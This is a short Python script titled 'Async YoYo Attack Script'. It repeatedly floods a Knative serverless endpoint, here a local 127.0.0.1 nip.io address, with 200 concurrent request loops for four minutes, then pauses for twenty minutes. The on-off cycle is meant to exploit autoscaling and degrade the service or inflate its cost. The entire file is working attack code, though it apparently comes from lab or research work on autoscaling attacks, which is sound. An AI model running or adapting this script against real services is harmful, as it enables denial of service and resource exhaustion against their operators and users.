import aiohttp
import asyncio
import sys
import time

# Configuration
TARGET_URL = "http://knative-fn4.default.127.0.0.1.nip.io/fib"
NORMAL_CONCURRENCY = 0
ATTACK_CONCURRENCY = 200  # Increase to compensate for async efficiency
ON_ATTACK_DURATION = 240
OFF_ATTACK_DURATION = 1200
CONNECTION_TIMEOUT = aiohttp.ClientTimeout(total=10)

async def worker(session, stop_time):
    """Async request worker"""
    while time.time() < stop_time:
        try:
            async with session.get(TARGET_URL) as response:
                await response.text()  # Consume response
        except Exception:
            pass

async def run_attack(concurrency, duration):
    """Run async load test"""
    stop_time = time.time() + duration
    connector = aiohttp.TCPConnector(limit=0)  # Disable connection limit
    async with aiohttp.ClientSession(
        connector=connector,
        timeout=CONNECTION_TIMEOUT,
        auto_decompress=True
    ) as session:
        tasks = []
        for _ in range(concurrency):
            task = asyncio.create_task(worker(session, stop_time))
            tasks.append(task)
        
        # Progress monitoring
        start_time = time.time()
        while time.time() < stop_time:
            elapsed = int(time.time() - start_time)
            remaining = int(stop_time - time.time())
            print(f"\rActive: {len(tasks)} | Elapsed: {elapsed}s | Remaining: {remaining}s", end="")
            await asyncio.sleep(1)
        
        # Cleanup
        for task in tasks:
            task.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)

def yoyo_attack():
    """Attack controller"""
    loop = asyncio.new_event_loop()
    try:
        while True:
            # Attack Phase
            print("\n=== ATTACK PHASE ===")
            loop.run_until_complete(run_attack(ATTACK_CONCURRENCY, ON_ATTACK_DURATION))

            # Cool Down
            print("\n=== COOL DOWN ===")
            loop.run_until_complete(run_attack(NORMAL_CONCURRENCY, OFF_ATTACK_DURATION))
            
    except KeyboardInterrupt:
        print("\nAttack stopped")
        loop.close()

if __name__ == "__main__":
    print("Async YoYo Attack Script")
    print(f"Target: {TARGET_URL}")
    print(f"Attack Concurrency: {ATTACK_CONCURRENCY}")
    yoyo_attack()